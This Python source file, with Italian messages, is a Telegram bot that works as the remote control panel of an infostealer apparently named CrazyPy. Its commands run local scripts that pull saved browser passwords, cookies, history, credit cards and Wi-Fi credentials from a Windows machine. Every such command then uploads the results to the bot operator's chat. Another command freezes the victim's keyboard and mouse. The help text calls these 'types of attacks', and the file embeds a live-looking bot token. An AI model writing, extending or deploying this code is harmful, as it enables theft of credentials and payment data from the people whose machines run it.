from telegram.ext import Updater, CommandHandler
from telegram.ext import MessageHandler, Filters
import telegram.ext
import time,os,getpass
import emoji
from ctypes import windll
import urllib.request

TOKEN = "1200557626:AAGPmgT-PBqUU05pWiwuyIoeQdVpy49MGJ0"
updater = Updater(TOKEN, use_context=True)
j = updater.job_queue
uu=updater.job_queue

def unknown(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Scusa non ho compreso bene il comando!!")
    context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":dizzy_face:"))

def history(update, context):
	username = getpass.getuser()
	avvio = f"python C:\\Users\\{username}\\Desktop\\CrazyPy\\Stealer\\Chromium\\History.py"
	os.system(avvio)
	emoction=emoji.emojize(":scroll:")
	context.bot.send_message(chat_id=update.effective_chat.id, text= f"Invio history in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'C:\\Users\\{username}\\Desktop\\CrazyPy\\Run\\Run\\bin\\Debug\\netcoreapp3.1\\output_file_history.txt', 'rb'))


def cookie(update, context):
	username = getpass.getuser()
	avvio = f"python C:\\Users\\{username}\\Desktop\\CrazyPy\\Stealer\\Chromium\\Cookies.py"
	os.system(avvio)
	emoction= emoji.emojize(":cookie:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio cookie in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'C:\\Users\\{username}\\Desktop\\CrazyPy\\Run\\Run\\bin\\Debug\\netcoreapp3.1\\output_file_cookie.txt', 'rb'))

def password(update, context):
	username = getpass.getuser()
	avvio = f"python C:\\Users\\{username}\\Desktop\\CrazyPy\\Stealer\\Chromium\\Passwords.py"
	os.system(avvio)
	emoction=emoji.emojize(":file_folder:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio password in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'C:\\Users\\{username}\\Desktop\\CrazyPy\\Run\\Run\\bin\\Debug\\netcoreapp3.1\\output_file_password.txt', 'rb'))

def wifi(update, context):
	username = getpass.getuser()
	avvio = f"python C:\\Users\\{username}\\Desktop\\CrazyPy\\Stealer\\Wifi.py"
	os.system(avvio)
	emoction=emoji.emojize(":level_slider:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio informazioni sul wifi in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'C:\\Users\\{username}\\Desktop\\CrazyPy\\Run\\Run\\bin\\Debug\\netcoreapp3.1\\output_file_wifi.txt', 'rb'))

def cards(update, context):
	username = getpass.getuser()
	avvio = f"python C:\\Users\\{username}\\Desktop\\CrazyPy\\Stealer\\Chromium\\CreditCards.py"
	os.system(avvio)
	emoction=emoji.emojize(":credit_card:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio credit cards in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'C:\\Users\\{username}\\Desktop\\CrazyPy\\Run\\Run\\bin\\Debug\\netcoreapp3.1\\output_file_card.txt', 'rb'))

def input_blocco(update, context):
	secondi=context.args[0]
	secondi= int(secondi)
	windll.user32.BlockInput(True)
	emoction=emoji.emojize(":keyboard:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Input bloccato... {emoction}")
	time.sleep(secondi)
	windll.user32.BlockInput(False)
	


def help1(update,context):
	emoction00=emoji.emojize(":smiling_face_with_sunglasses:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f" {emoction00} Tipi di attacchi :  {emoction00} ")
	emoction0=emoji.emojize(":file_folder:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_password {emoction0} : Ottenere un file con le password")
	emoction2=emoji.emojize(":scroll:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_history {emoction2} : Ottenere la history")
	emoction3= emoji.emojize(":cookie:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_cookie {emoction3} : Ottenere i cookies")
	emoction5= emoji.emojize(":credit_card:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_credit_cards {emoction5} : Ottenere le carte di credito")
	emoction4= emoji.emojize(":level_slider:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_wifi {emoction4} : Ottenere il wifi")
	emoction8= emoji.emojize(":keyboard:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/block_input n_seconds  {emoction8} :Bloccare Input del pc per n secondi")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/help: Vi mostro i comandi che potete scrivere perche io vi possa rispondere")



def main():
	print("Sto ascoltando...")
	dp = updater.dispatcher
	dp.add_handler(CommandHandler('help', help1))
	dp.add_handler(CommandHandler('get_password',password))
	dp.add_handler(CommandHandler('get_history',history))
	dp.add_handler(CommandHandler('get_cookie',cookie))
	dp.add_handler(CommandHandler('get_credit_cards',cards))
	dp.add_handler(CommandHandler('get_wifi',wifi))
	dp.add_handler(CommandHandler('block_input',input_blocco,pass_args=True,pass_chat_data=True))
	
	

	unknown_handler = MessageHandler(Filters.command, unknown)
	dp.add_handler(unknown_handler)
	updater.start_polling()
	updater.idle()


main()
